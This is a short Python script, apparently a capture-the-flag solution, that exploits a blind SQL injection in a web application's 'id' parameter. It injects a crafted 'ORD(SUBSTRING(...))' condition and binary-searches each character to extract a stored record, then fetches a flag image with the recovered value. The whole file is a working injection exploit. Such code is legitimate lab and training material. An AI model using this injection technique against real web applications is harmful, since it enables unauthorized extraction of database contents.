#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
~Gros
'''


import requests
from config import url_task4 as url
from config import proxies
from base64 import b64decode
import shutil


def check_one(position, to_check):
    flag_id = 1
    the_hash = 'whatever'
    payload = "1=0 or (ID={} and ORD(SUBSTRING(Data, {}, 1)) < {})".format(flag_id, position, to_check)
    response = requests.get(url, params={'id':payload, 'hash':the_hash})
    if 'record not found' in response.text:
        return False
    return True


def binsearch_one(position):
    start = 0
    end = 256
    while start + 1 != end:
        middle = start + ((end-start) // 2)
        # print(start, end, middle)
        result = check_one(position, middle)
        if result:
            end = middle
        else:
            start = middle
    return start


def get_enc_flag():
    flag = ''
    while True:
        result = binsearch_one(len(flag)+1)
        if result == 0:
            break
        flag += chr(result)
        print('[i] {}'.format(flag))

    # flag += '='*(4 - len(flag)%4)
    print('[+] Done')
    print('[+] {}'.format(flag))
    return flag


if __name__ == "__main__":
    flag_enc = get_enc_flag()
    response = requests.get(url+'/captcha', params={'w':200, 'c': flag_enc}, stream=True, proxies=proxies)
    if response.status_code == 200:
        with open('flag.png', 'wb') as f:
            response.raw.decode_content = True
            shutil.copyfileobj(response.raw, f)

    